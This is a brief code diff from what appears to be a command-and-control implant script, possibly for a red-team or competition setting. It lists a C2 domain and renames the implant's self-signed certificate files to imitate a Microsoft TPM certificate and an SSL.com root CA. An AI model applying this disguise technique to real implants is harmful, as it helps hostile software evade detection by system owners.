@@ -25,9 +25,9 @@ C2_DOMAINS = ["https://midevil-scoring-engine.com",
 
 # Path to self-signed cert
 if platform.system() == "Windows":
-    CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\snakeeyes-ca.crt"
+    CERT_PATH = r"C:\\ProgramData\\Microsoft\\Network\\TPMNetworkModuleCertificate\\Microsoft_TPM_Network_DSA_Trust.crt"
 else:
-    CERT_PATH = r"/usr/local/share/ca-certificates/snakeeyes-ca.crt"
+    CERT_PATH = r"/etc/ssl/certs/SSL.com_TLS_DSA_Root_CA_2022.crt"
 
 
 def get_system_info():
